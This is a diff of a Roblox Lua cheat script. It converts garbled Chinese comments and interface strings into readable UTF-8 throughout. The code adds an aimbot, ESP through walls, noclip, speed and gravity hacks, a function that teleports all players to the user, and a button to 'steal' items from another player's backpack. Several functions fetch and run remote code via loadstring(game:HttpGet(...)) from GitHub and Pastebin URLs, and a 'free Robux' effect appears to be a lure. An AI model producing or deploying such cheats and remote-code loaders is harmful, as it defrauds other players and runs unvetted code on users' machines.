-    local espHighlights = {} -- 瀛樺偍閫忚楂樹寒瀵硅薄
-    local spinningOnNearest = false -- 寰幆鏃嬭浆鏈€杩戠帺瀹�
-    local bulletTrackEnabled = false -- 瀛愬脊杩借釜鐘舵€�
-    local faceNearbyEnabled = false -- 寰幆闈㈠悜闄勮繎鐜╁
-    local backNearbyEnabled = false -- 寰幆鑳屽闄勮繎鐜╁
-    local antiPullbackEnabled = false -- 闃叉媺鍥炲姛鑳�
-    local lastPosition = nil -- 璁板綍鏈€鍚庝綅缃�
+    local aimToHead = true -- 默认瞄准头部
+    local espHighlights = {} -- 存储透视高亮对象
+    local spinningOnNearest = false -- 循环旋转最近玩家
+    local bulletTrackEnabled = false -- 子弹追踪状态
+    local faceNearbyEnabled = false -- 循环面向附近玩家
+    local backNearbyEnabled = false -- 循环背对附近玩家
+    local antiPullbackEnabled = false -- 防拉回功能
+    local lastPosition = nil -- 记录最后位置
 
-    -- 鎾斁鐐瑰嚮闊虫晥鍑芥暟
+    -- 播放点击音效函数
     local function playClickSound()
         local sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://82845990304289"
@@ -721,7 +721,7 @@ local function loadScript()
         game:GetService("Debris"):AddItem(sound, 2)
     end
 
-    -- 閫氱煡鍑芥暟锛堝噺灏忛€氱煡灏哄锛�
+    -- 通知函数（减小通知尺寸）
     local function showNotification(message, color)
         local notification = Instance.new("Frame")
         notification.Size = UDim2.new(0, 200, 0, 40)
@@ -753,7 +753,7 @@ local function loadScript()
         notification:Destroy()
     end
 
-    -- UI鎺у埗
+    -- UI控制
     local minimized = false
     local minimizeTween = nil
     local function toggleMinimize()
@@ -766,7 +766,7 @@ local function loadScript()
         end
 
         if minimized then
-            -- 缂╁皬鍚庝繚鐣欐爣棰樻爮锛岀偣鍑烩€�+鈥濆嵆鍙仮澶嶅師绐楀彛
+            -- 缩小后保留标题栏，点击“+”即可恢复原窗口
             TabFrame.Visible = false
             MainContent.Visible = false
             MinimizeButton.Text = "+"
@@ -776,7 +776,7 @@ local function loadScript()
                 {Size = UDim2.new(0, 120, 0, 27)}
             )
         else
-            -- 鏀惧ぇ鎭㈠鍚庝粛鍙啀娆＄偣鍑烩€淿鈥濈缉灏�
+            -- 放大恢复后仍可再次点击“_”缩小
             TabFrame.Visible = true
             MainContent.Visible = true
             MinimizeButton.Text = "_"
@@ -790,7 +790,7 @@ local function loadScript()
         minimizeTween:Play()
     end
 
-    -- 閫夋嫨鐜╁
+    -- 选择玩家
     local function selectPlayer()
         playClickSound()
         local playerList = Players:GetPlayers()
@@ -806,18 +806,18 @@ local function loadScript()
         end
         
         selectedPlayer = playerList[(currentIndex % #playerList) + 1]
-        ButtonInstances.PlayerButton.Text = "閫夋嫨鐜╁: " .. selectedPlayer.Name
-        showNotification("宸查€夋嫨鐜╁: " .. selectedPlayer.Name, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.PlayerButton.Text = "选择玩家: " .. selectedPlayer.Name
+        showNotification("已选择玩家: " .. selectedPlayer.Name, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 鑴氭湰鍔犺浇鍑芥暟
+    -- 脚本加载函数
     local function loadExternalScript(url, name)
         playClickSound()
         loadstring(game:HttpGet(url))()
-        showNotification(name .. "宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification(name .. "已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 鍏嶈垂r甯佸叏灞忕壒鏁堝嚱鏁�
+    -- 免费r币全屏特效函数
     local fullScreenEffectActive = false
     local fullScreenImage = nil
     local fullScreenSound = nil
@@ -825,7 +825,7 @@ local function loadScript()
     local function showFreeRBCurrencyEffect()
         playClickSound()
         
-        -- 濡傛灉宸茬粡瀛樺湪鐗规晥锛屽厛绉婚櫎鏃х殑
+        -- 如果已经存在特效，先移除旧的
         if fullScreenEffectActive then
             if fullScreenImage then
                 fullScreenImage:Destroy()
@@ -838,7 +838,7 @@ local function loadScript()
             end
         end
         
-        -- 鍒涘缓鍏ㄥ睆鍥剧墖
+        -- 创建全屏图片
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "FreeRBCurrencyEffect"
         screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -856,32 +856,32 @@ local function loadScript()
         fullScreenImage.ZIndex = 999999
         fullScreenImage.Parent = screenGui
         
-        -- 鍒涘缓闊抽鎾斁鍣�
+        -- 创建音频播放器
         fullScreenSound = Instance.new("Sound")
         fullScreenSound.SoundId = "rbxassetid://103215672097028"
         fullScreenSound.Looped = true
         fullScreenSound.Volume = 1
         fullScreenSound.Parent = Workspace
         
-        -- 寰幆鎾斁闊抽
+        -- 循环播放音频
         fullScreenSound:Play()
         
         fullScreenEffectActive = true
         
-        -- 鏄剧ず閫氱煡
-        showNotification("鍏嶈垂R甯佺壒鏁堝凡鍚姩!", Color3.fromRGB(255, 100, 0))
+        -- 显示通知
+        showNotification("免费R币特效已启动!", Color3.fromRGB(255, 100, 0))
     end
 
-    -- 鏄剧ず纰版挒绠卞姛鑳�
+    -- 显示碰撞箱功能
     local function toggleCollisionBox()
         playClickSound()
         showCollision = not showCollision
         
         if showCollision then
-            ButtonInstances.CollisionBoxButton.Text = "鏄剧ず纰版挒绠� [寮€鍚痌"
+            ButtonInstances.CollisionBoxButton.Text = "显示碰撞箱 [开启]"
             ButtonInstances.CollisionBoxButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
-            -- 鏄剧ず纰版挒绠�
+            -- 显示碰撞箱
             for _, obj in pairs(Workspace:GetDescendants()) do
                 if obj:IsA("BasePart") and obj.Name ~= "Handle" and not obj:IsDescendantOf(LocalPlayer.Character or LocalPlayer) then
                     local box = Instance.new("SelectionBox")
@@ -894,32 +894,32 @@ local function loadScript()
                 end
             end
             
-            showNotification("纰版挒绠辨樉绀哄凡寮€鍚�", Color3.fromRGB(0, 200, 0))
+            showNotification("碰撞箱显示已开启", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.CollisionBoxButton.Text = "鏄剧ず纰版挒绠� [鍏抽棴]"
+            ButtonInstances.CollisionBoxButton.Text = "显示碰撞箱 [关闭]"
             ButtonInstances.CollisionBoxButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
-            -- 绉婚櫎纰版挒绠�
+            -- 移除碰撞箱
             for _, obj in pairs(Workspace:GetDescendants()) do
                 if obj:FindFirstChild("BaconCollisionBox") then
                     obj.BaconCollisionBox:Destroy()
                 end
             end
             
-            showNotification("纰版挒绠辨樉绀哄凡鍏抽棴", Color3.fromRGB(150, 150, 150))
+            showNotification("碰撞箱显示已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 鑷瀯鍔熻兘
+    -- 自瞄功能
     local function toggleAimbot()
         playClickSound()
         aimbotEnabled = not aimbotEnabled
         
         if aimbotEnabled then
-            ButtonInstances.AimbotButton.Text = "鑷瀯 [寮€鍚痌"
+            ButtonInstances.AimbotButton.Text = "自瞄 [开启]"
             ButtonInstances.AimbotButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
-            -- 鑷瀯閫昏緫
+            -- 自瞄逻辑
             connections.aimbot = RunService.RenderStepped:Connect(function()
                 if aimbotEnabled then
                     local character = LocalPlayer.Character
@@ -962,9 +962,9 @@ local function loadScript()
                 end
             end)
             
-            showNotification("鑷瀯宸插紑鍚� (鐬勫噯" .. (aimToHead and "澶撮儴" or "韬綋") .. ")", Color3.fromRGB(0, 200, 0))
+            showNotification("自瞄已开启 (瞄准" .. (aimToHead and "头部" or "身体") .. ")", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.AimbotButton.Text = "鑷瀯 [鍏抽棴]"
+            ButtonInstances.AimbotButton.Text = "自瞄 [关闭]"
             ButtonInstances.AimbotButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
             if connections.aimbot then
@@ -972,20 +972,20 @@ local function loadScript()
                 connections.aimbot = nil
             end
             
-            showNotification("鑷瀯宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("自瞄已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 閫忚鐜╁鍔熻兘
+    -- 透视玩家功能
     local function togglePlayerESP()
         playClickSound()
         playerESPEnabled = not playerESPEnabled
         
         if playerESPEnabled then
-            ButtonInstances.PlayerESPButton.Text = "閫忚鐜╁ [寮€鍚痌"
+            ButtonInstances.PlayerESPButton.Text = "透视玩家 [开启]"
             ButtonInstances.PlayerESPButton.TextColor3 = Color3.fromRGB(0, 255, 150)
             
-            -- 涓烘墍鏈夌帺瀹跺垱寤洪珮浜�
+            -- 为所有玩家创建高亮
             local function createESP(player)
                 if player ~= LocalPlayer and player.Character then
                     local highlight = Instance.new("Highlight")
@@ -1001,17 +1001,17 @@ local function loadScript()
                 end
             end
             
-            -- 涓虹幇鏈夌帺瀹跺垱寤篍SP
+            -- 为现有玩家创建ESP
             for _, player in pairs(Players:GetPlayers()) do
                 createESP(player)
             end
             
-            -- 鐩戝惉鏂扮帺瀹跺姞鍏�
+            -- 监听新玩家加入
             connections.playerAddedESP = Players.PlayerAdded:Connect(function(player)
                 createESP(player)
             end)
             
-            -- 鐩戝惉鐜╁绂诲紑
+            -- 监听玩家离开
             connections.playerRemovingESP = Players.PlayerRemoving:Connect(function(player)
                 if espHighlights[player] then
                     espHighlights[player]:Destroy()
@@ -1019,7 +1019,7 @@ local function loadScript()
                 end
             end)
             
-            -- 鐩戝惉鐜╁瑙掕壊鍙樺寲
+            -- 监听玩家角色变化
             for _, player in pairs(Players:GetPlayers()) do
                 if player ~= LocalPlayer then
                     connections[player] = player.CharacterAdded:Connect(function(character)
@@ -1031,12 +1031,12 @@ local function loadScript()
                 end
             end
             
-            showNotification("閫忚鐜╁宸插紑鍚�", Color3.fromRGB(0, 200, 0))
+            showNotification("透视玩家已开启", Color3.fromRGB(0, 200, 0))
         else
-            ButtonInstances.PlayerESPButton.Text = "閫忚鐜╁ [鍏抽棴]"
+            ButtonInstances.PlayerESPButton.Text = "透视玩家 [关闭]"
             ButtonInstances.PlayerESPButton.TextColor3 = Color3.fromRGB(200, 200, 255)
             
-            -- 绉婚櫎鎵€鏈夐珮浜�
+            -- 移除所有高亮
             for player, highlight in pairs(espHighlights) do
                 if highlight then
                     highlight:Destroy()
@@ -1044,7 +1044,7 @@ local function loadScript()
             end
             espHighlights = {}
             
-            -- 鏂紑杩炴帴
+            -- 断开连接
             if connections.playerAddedESP then
                 connections.playerAddedESP:Disconnect()
                 connections.playerAddedESP = nil
@@ -1062,18 +1062,18 @@ local function loadScript()
                 end
             end
             
-            showNotification("閫忚鐜╁宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("透视玩家已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 椋炶鍔熻兘锛堜慨鏀逛负鍩规牴椋炶鑴氭湰锛�
+    -- 飞行功能（修改为培根飞行脚本）
     local function loadFly()
         playClickSound()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconhead123/fe-/refs/heads/main/鍩规牴椋炶"))()
-        showNotification("椋炶宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconhead123/fe-/refs/heads/main/培根飞行"))()
+        showNotification("飞行已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 闃叉憯鍔熻兘
+    -- 防摔功能
     local function loadAntiFall()
         playClickSound()
         loadstring([[
@@ -1106,16 +1106,16 @@ Player.CharacterAdded:Connect(function()
     setupSafeImmunity()
 end)
 
-print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
+print("安全版自然灾害免疫已激活")
 ]])()
-        showNotification("闃叉憯宸叉縺娲�", Color3.fromRGB(0, 200, 0))
+        showNotification("防摔已激活", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 绌垮鍔熻兘锛堜慨澶嶇増锛�
+    -- 穿墙功能（修复版）
     local function toggleNoclip()
         playClickSound()
         noclip = not noclip
-        ButtonInstances.NoclipButton.Text = "绌垮妯″紡 [" .. (noclip and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.NoclipButton.Text = "穿墙模式 [" .. (noclip and "开启]" or "关闭]")
         ButtonInstances.NoclipButton.TextColor3 = noclip and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if noclip then
@@ -1129,14 +1129,14 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     end
                 end
             end)
-            showNotification("绌垮妯″紡宸插紑鍚�", Color3.fromRGB(0, 150, 200))
+            showNotification("穿墙模式已开启", Color3.fromRGB(0, 150, 200))
         else
             if connections.noclip then 
                 connections.noclip:Disconnect() 
                 connections.noclip = nil
             end
             
-            -- 鎭㈠纰版挒
+            -- 恢复碰撞
             local character = LocalPlayer.Character
             if character then
                 for _, part in pairs(character:GetDescendants()) do
@@ -1146,17 +1146,17 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 end
             end
             
-            showNotification("绌垮妯″紡宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("穿墙模式已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 鏃犻檺璺宠穬
+    -- 无限跳跃
     local function toggleInfiniteJump()
         playClickSound()
         infiniteJump = not infiniteJump
-        ButtonInstances.InfiniteJumpButton.Text = "鏃犻檺璺宠穬 [" .. (infiniteJump and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.InfiniteJumpButton.Text = "无限跳跃 [" .. (infiniteJump and "开启]" or "关闭]")
         ButtonInstances.InfiniteJumpButton.TextColor3 = infiniteJump and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
-        showNotification("鏃犻檺璺宠穬" .. (infiniteJump and "宸插紑鍚�" or "宸插叧闂�"), Color3.fromRGB(0, 150, 200))
+        showNotification("无限跳跃" .. (infiniteJump and "已开启" or "已关闭"), Color3.fromRGB(0, 150, 200))
     end
 
     UserInputService.JumpRequest:Connect(function()
@@ -1166,31 +1166,31 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         end
     end)
 
-    -- 绉诲姩閫熷害
+    -- 移动速度
     local function changeSpeed()
         playClickSound()
         walkSpeed = (walkSpeed % 100) + 8
         local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then humanoid.WalkSpeed = walkSpeed end
-        ButtonInstances.SpeedButton.Text = "绉诲姩閫熷害: " .. walkSpeed
-        showNotification("绉诲姩閫熷害璁剧疆涓�: " .. walkSpeed, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.SpeedButton.Text = "移动速度: " .. walkSpeed
+        showNotification("移动速度设置为: " .. walkSpeed, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 璺宠穬楂樺害
+    -- 跳跃高度
     local function changeJump()
         playClickSound()
         jumpPower = (jumpPower % 200) + 25
         local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then humanoid.JumpPower = jumpPower end
-        ButtonInstances.JumpButton.Text = "璺宠穬楂樺害: " .. jumpPower
-        showNotification("璺宠穬楂樺害璁剧疆涓�: " .. jumpPower, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.JumpButton.Text = "跳跃高度: " .. jumpPower
+        showNotification("跳跃高度设置为: " .. jumpPower, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 鐖鍔熻兘
+    -- 爬墙功能
     local function toggleClimbWall()
         playClickSound()
         climbing = not climbing
-        ButtonInstances.ClimbWallButton.Text = "鐖妯″紡 [" .. (climbing and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.ClimbWallButton.Text = "爬墙模式 [" .. (climbing and "开启]" or "关闭]")
         ButtonInstances.ClimbWallButton.TextColor3 = climbing and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if climbing then
@@ -1209,25 +1209,25 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     end
                 end
             end)
-            showNotification("鐖妯″紡宸插紑鍚�! 纰板埌澧欎細鑷姩涓婂崌", Color3.fromRGB(0, 150, 200))
+            showNotification("爬墙模式已开启! 碰到墙会自动上升", Color3.fromRGB(0, 150, 200))
         else
             if connections.climb then connections.climb:Disconnect() end
-            showNotification("鐖妯″紡宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("爬墙模式已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 鐖v2鍔熻兘
+    -- 爬墙v2功能
     local function loadClimbWallV2()
         playClickSound()
         loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
-        showNotification("鐖v2宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+        showNotification("爬墙v2已加载!", Color3.fromRGB(0, 200, 0))
     end
 
-    -- 浜虹墿鏃嬭浆
+    -- 人物旋转
     local function toggleSpin()
         playClickSound()
         spinning = not spinning
-        ButtonInstances.SpinButton.Text = "浜虹墿鏃嬭浆 [" .. (spinning and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.SpinButton.Text = "人物旋转 [" .. (spinning and "开启]" or "关闭]")
         ButtonInstances.SpinButton.TextColor3 = spinning and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if spinning then
@@ -1237,26 +1237,26 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                 end
             end)
-            showNotification("浜虹墿鏃嬭浆宸插紑鍚�", Color3.fromRGB(0, 150, 200))
+            showNotification("人物旋转已开启", Color3.fromRGB(0, 150, 200))
         else
             if connections.spin then connections.spin:Disconnect() end
-            showNotification("浜虹墿鏃嬭浆宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("人物旋转已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 鏃嬭浆閫熷害
+    -- 旋转速度
     local function changeSpinSpeed()
         playClickSound()
         spinSpeed = (spinSpeed % 50) + 5
-        ButtonInstances.SpinSpeedButton.Text = "鏃嬭浆閫熷害: " .. spinSpeed
-        showNotification("鏃嬭浆閫熷害璁剧疆涓�: " .. spinSpeed, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.SpinSpeedButton.Text = "旋转速度: " .. spinSpeed
+        showNotification("旋转速度设置为: " .. spinSpeed, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 鑷姩绉诲姩
+    -- 自动移动
     local function toggleAutoMove()
         playClickSound()
         autoMove = not autoMove
-        ButtonInstances.AutoMoveButton.Text = "鑷姩绉诲姩 [" .. (autoMove and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.AutoMoveButton.Text = "自动移动 [" .. (autoMove and "开启]" or "关闭]")
         ButtonInstances.AutoMoveButton.TextColor3 = autoMove and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if autoMove then
@@ -1266,14 +1266,14 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     character.HumanoidRootPart.Velocity = character.HumanoidRootPart.CFrame.LookVector * 20
                 end
             end)
-            showNotification("鑷姩绉诲姩宸插紑鍚�", Color3.fromRGB(0, 150, 200))
+            showNotification("自动移动已开启", Color3.fromRGB(0, 150, 200))
         else
             if connections.autoMove then connections.autoMove:Disconnect() end
-            showNotification("鑷姩绉诲姩宸插叧闂�", Color3.fromRGB(150, 150, 150))
+            showNotification("自动移动已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 浼犻€佹墍鏈変汉鍒版垜
+    -- 传送所有人到我
     local function teleportAllToMe()
         playClickSound()
         local myCharacter = LocalPlayer.Character
@@ -1287,21 +1287,21 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     end
                 end
             end
-            showNotification("宸蹭紶閫佹墍鏈夌帺瀹�", Color3.fromRGB(0, 200, 0))
+            showNotification("已传送所有玩家", Color3.fromRGB(0, 200, 0))
         end
     end
 
-    -- 寰幆鏃嬭浆鏈€杩戠帺瀹�
+    -- 循环旋转最近玩家
     local function toggleAutoSpinNearest()
         playClickSound()
         spinningOnNearest = not spinningOnNearest
-        ButtonInstances.AutoSpinNearestButton.Text = "寰幆鏃嬭浆鏈€杩戠帺瀹� [" .. (spinningOnNearest and "寮€鍚痌" or "鍏抽棴]")
+        ButtonInstances.AutoSpinNearestButton.Text = "循环旋转最近玩家 [" .. (spinningOnNearest and "开启]" or "关闭]")
         ButtonInstances.AutoSpinNearestButton.TextColor3 = spinningOnNearest and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
         
         if spinningOnNearest then
             connections.autoSpinNearest = RunService.Heartbeat:Connect(function()
                 if spinningOnNearest and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    -- 鑾峰彇鏈€杩戠帺瀹�
+                    -- 获取最近玩家
                     local nearestPlayer = nil
                     local shortestDistance = math.huge
                     
@@ -1324,25 +1324,25 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                     end
                 end
             end)
-            showNotification("寰幆鏃嬭浆鏈€杩戠帺瀹跺凡寮€鍚�", Color3.fromRGB(0, 200, 0))
+            showNotification("循环旋转最近玩家已开启", Color3.fromRGB(0, 200, 0))
         else
             if connections.autoSpinNearest then
                 connections.autoSpinNearest:Disconnect()
                 connections.autoSpinNearest = nil
             end
-            showNotification("寰幆鏃嬭浆鏈€杩戠帺瀹跺凡鍏抽棴", Color3.fromRGB(150, 150, 150))
+            showNotification("循环旋转最近玩家已关闭", Color3.fromRGB(150, 150, 150))
         end
     end
 
-    -- 鏌ョ湅鐜╁鑳屽寘
+    -- 查看玩家背包
     local function viewPlayerBackpack()
         playClickSound()
         if not selectedPlayer then
-            showNotification("璇峰厛閫夋嫨涓€涓帺瀹�!", Color3.fromRGB(255, 50, 50))
+            showNotification("请先选择一个玩家!", Color3.fromRGB(255, 50, 50))
             return
         end
 
-        -- 鍒涘缓鑳屽寘鏌ョ湅绐楀彛
+        -- 创建背包查看窗口
         local backpackFrame = Instance.new("Frame")
         backpackFrame.Size = UDim2.new(0, 267, 0, 333)
         backpackFrame.Position = UDim2.new(0.5, -133.5, 0.5, -166.5)
@@ -1357,7 +1357,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         Instance.new("UIStroke", backpackFrame).Color = Color3.fromRGB(0, 150, 255)
         backpackFrame.Parent = ScreenGui
 
-        -- 鏍囬鏍�
+        -- 标题栏
         local titleBar = Instance.new("Frame")
         titleBar.Size = UDim2.new(1, 0, 0, 27)
         titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
@@ -1371,7 +1371,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         titleLabel.Size = UDim2.new(1, -33.5, 1, 0)
         titleLabel.Position = UDim2.new(0, 10, 0, 0)
         titleLabel.BackgroundTransparency = 1
-        titleLabel.Text = selectedPlayer.Name .. "鐨勮儗鍖�"
+        titleLabel.Text = selectedPlayer.Name .. "的背包"
         titleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
         titleLabel.TextSize = 18
         titleLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -1392,7 +1392,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 5.3)
         closeButton.Parent = titleBar
 
-        -- 鍐呭鍖哄煙
+        -- 内容区域
         local contentFrame = Instance.new("ScrollingFrame")
         contentFrame.Size = UDim2.new(1, -13.3, 1, -40)
         contentFrame.Position = UDim2.new(0, 6.7, 0, 33.3)
@@ -1408,12 +1408,12 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         contentLayout.Padding = UDim.new(0, 6.7)
         Instance.new("UIPadding", contentFrame).PaddingTop = UDim.new(0, 3.3)
 
-        -- 鑾峰彇鐩爣鐜╁鐨勮儗鍖呭拰瑙掕壊涓殑宸ュ叿
+        -- 获取目标玩家的背包和角色中的工具
         local targetBackpack = selectedPlayer:FindFirstChildOfClass("Backpack")
         local targetCharacter = selectedPlayer.Character
         local tools = {}
 
-        -- 浠庤儗鍖呰幏鍙栧伐鍏�
+        -- 从背包获取工具
         if targetBackpack then
             for _, tool in ipairs(targetBackpack:GetChildren()) do
                 if tool:IsA("Tool") then
@@ -1422,7 +1422,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             end
         end
 
-        -- 浠庤鑹茶幏鍙栧伐鍏�
+        -- 从角色获取工具
         if targetCharacter then
             for _, tool in ipairs(targetCharacter:GetChildren()) do
                 if tool:IsA("Tool") then
@@ -1431,12 +1431,12 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             end
         end
 
-        -- 鏄剧ず宸ュ叿鍒楄〃
+        -- 显示工具列表
         if #tools == 0 then
             local noItemsLabel = Instance.new("TextLabel")
             noItemsLabel.Size = UDim2.new(1, 0, 0, 33.3)
             noItemsLabel.BackgroundTransparency = 1
-            noItemsLabel.Text = "鑳屽寘涓虹┖"
+            noItemsLabel.Text = "背包为空"
             noItemsLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
             noItemsLabel.TextSize = 16
             noItemsLabel.Font = Enum.Font.Gotham
@@ -1470,7 +1470,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 stealButton.Position = UDim2.new(0.6, 3.3, 0, 3.3)
                 stealButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
                 stealButton.BackgroundTransparency = 0.2
-                stealButton.Text = "鍋峰彇"
+                stealButton.Text = "偷取"
                 stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                 stealButton.TextSize = 14
                 stealButton.Font = Enum.Font.GothamBold
@@ -1482,7 +1482,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 itemDesc.Size = UDim2.new(1, -13.3, 0.5, -3.3)
                 itemDesc.Position = UDim2.new(0, 6.7, 0.5, 0)
                 itemDesc.BackgroundTransparency = 1
-                itemDesc.Text = "宸ュ叿绫荤墿鍝�"
+                itemDesc.Text = "工具类物品"
                 itemDesc.TextColor3 = Color3.fromRGB(150, 150, 200)
                 itemDesc.TextSize = 12
                 itemDesc.TextXAlignment = Enum.TextXAlignment.Left
@@ -1490,19 +1490,19 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 itemDesc.ZIndex = 53
                 itemDesc.Parent = itemFrame
 
-                -- 鍋峰彇鍔熻兘
+                -- 偷取功能
                 stealButton.MouseButton1Click:Connect(function()
                     playClickSound()
                     local clone = tool:Clone()
                     if LocalPlayer.Backpack then
                         clone.Parent = LocalPlayer.Backpack
-                        showNotification("宸插伔鍙�: " .. tool.Name, Color3.fromRGB(0, 200, 0))
+                        showNotification("已偷取: " .. tool.Name, Color3.fromRGB(0, 200, 0))
                     else
-                        showNotification("鏃犳硶鍋峰彇鐗╁搧: 鑳屽寘涓嶅瓨鍦�", Color3.fromRGB(255, 50, 50))
+                        showNotification("无法偷取物品: 背包不存在", Color3.fromRGB(255, 50, 50))
                     end
                 end)
 
-                -- 鎸夐挳鎮仠鏁堟灉
+                -- 按钮悬停效果
                 stealButton.MouseEnter:Connect(function()
                     stealButton.BackgroundTransparency = 0
                 end)
@@ -1513,16 +1513,16 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
             end
         end
 
-        -- 鍏抽棴鎸夐挳浜嬩欢
+        -- 关闭按钮事件
         closeButton.MouseButton1Click:Connect(function()
             playClickSound()
             backpackFrame:Destroy()
         end)
 
-        showNotification("姝ｅ湪鏌ョ湅" .. selectedPlayer.Name .. "鐨勮儗鍖�", Color3.fromRGB(0, 150, 200))
+        showNotification("正在查看" .. selectedPlayer.Name .. "的背包", Color3.fromRGB(0, 150, 200))
     end
 
-    -- 鐜╁澶у皬
+    -- 玩家大小
     local function changePlayerSize()
         playClickSound()
         playerSize = (playerSize % 3) + 0.5
@@ -1532,43 +1532,43 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
                 if part:IsA("BasePart") then part.Size = part.Size * playerSize end
             end
         end
-        ButtonInstances.PlayerSizeButton.Text = "鐜╁澶у皬: " .. playerSize
-        showNotification("鐜╁澶у皬璁剧疆涓�: " .. playerSize, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.PlayerSizeButton.Text = "玩家大小: " .. playerSize
+        showNotification("玩家大小设置为: " .. playerSize, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 閲嶅姏璁剧疆
+    -- 重力设置
     local function changeGravity()
         playClickSound()
         gravity = (gravity == 196.2) and 0 or (gravity + 50)
         if gravity > 196.2 then gravity = 196.2 end
         Workspace.Gravity = gravity
-        ButtonInstances.GravityButton.Text = "閲嶅姏璁剧疆: " .. gravity
-        showNotification("閲嶅姏璁剧疆涓�: " .. gravity, Color3.fromRGB(0, 150, 200))
+        ButtonInstances.GravityButton.Text = "重力设置: " .. gravity
+        showNotification("重力设置为: " .. gravity, Color3.fromRGB(0, 150, 200))
     end
 
-    -- 澶滆鍔熻兘
+    -- 夜视功能
